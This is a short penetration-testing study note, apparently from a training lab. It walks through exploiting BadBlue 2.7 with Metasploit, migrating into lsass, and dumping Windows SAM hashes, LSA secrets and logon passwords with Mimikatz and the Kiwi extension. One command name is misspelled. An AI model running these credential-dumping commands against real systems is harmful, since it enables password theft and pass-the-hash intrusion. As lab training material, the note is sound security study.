
Mimikatz is a windows [[Post Exploitation]] tool that allows the extraction of clear-text passwords, hashes and Kerberos tickets from memory.

We can use mimikatz to extract hashes from the lsass.exe process memory where hashes are cached.

We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target we can use the meterpreter extension called Kiwi.

---

Lab Writeup:

We exploit BadBlue 2.7 using [[metasploit]] for foothold

Then we need to migrate to lsass:

``` bash
pgrep lsass
migrate [PID]
```

``` bash
load kiwi
```

We can open the help window using "?"
We use every area just by typing the name and pressing enter

We may have no clear-text passwords specified, for reasons check [[Windows Password Hashes]]

We will usually go with lsa_dump_sam and lsa_dump_secrets

We can use password_change if we really need to but its usually a very drastic method

We can either crack hashes or perform a [[Pass-The-Hash Attacks]]

If we dont want to use Kiwi we can upload mimikatz using meterpreter:

``` bash
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Then we can run it with:

``` bash
.\mimikatz.exe
```

We need to run privilege::debug, we need privilege "20" to be able to dump hashes, which we can do with:

``` bash
lsadump::sam
lsadump::secrets
```

We can also use mimikatz to show logon passwords if Windows has been setup to store logon passwords:

``` bash
sekurlsa:logonpaswords
```

